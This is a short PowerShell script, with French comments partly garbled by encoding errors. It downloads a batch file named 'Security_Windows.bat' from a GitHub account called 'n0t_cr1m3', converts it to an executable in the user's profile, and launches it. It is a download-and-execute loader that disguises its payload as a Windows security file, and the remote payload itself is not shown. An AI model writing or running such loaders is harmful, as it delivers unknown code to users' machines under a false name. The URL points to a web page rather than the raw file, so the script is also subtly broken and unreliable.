$url = "https://github.com/n0t_cr1m3/test/blob/main/Security_Windows.bat"

# Sp�cifiez le chemin de destination o� le fichier sera enregistr�
$destination = "$env:USERPROFILE/Security_Windows.bat"
$convertedExePath = "$env:USERPROFILE/Security_Windows.exe"

# T�l�charge le fichier depuis l'URL sp�cifi�e
Invoke-WebRequest -Uri $url -OutFile $destination

bat_to_exe_converter.exe /bat $destination /exe $convertedExePath

# Ex�cute le fichier t�l�charg�
Start-Process -FilePath $convertedExePath
            